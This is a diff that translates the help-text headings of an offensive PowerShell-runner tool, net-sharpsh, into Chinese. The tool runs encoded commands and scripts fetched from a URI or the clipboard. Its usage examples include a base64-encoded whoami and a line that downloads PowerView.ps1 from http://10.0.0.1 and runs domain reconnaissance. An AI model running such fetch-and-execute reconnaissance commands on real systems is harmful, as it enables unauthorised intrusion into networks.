@@ -1,17 +1,17 @@
-ABOUT
+关于
     C# PowerShell execution via RunspaceFactory. Supports encoded commands, remote
     script loading, and clipboard script execution. Designed for inline assembly use.
 
-USAGE:
+用法：
     net-sharpsh --- -c <command> [options]
 
-OPTIONS:
+选项：
     -c, --cmd          PowerShell command to run (required)
     -u, --uri          Fetch script from URI before executing command
     -p, --clipboard    Fetch script from clipboard before executing command
     -e, --encoded      Command is base64 encoded
 
-EXAMPLES:
+示例：
     net-sharpsh --- -c whoami
     net-sharpsh --- -e -c d2hvYW1pCg==
     net-sharpsh --- -u http://10.0.0.1/PowerView.ps1 -c get-netlocalgroup
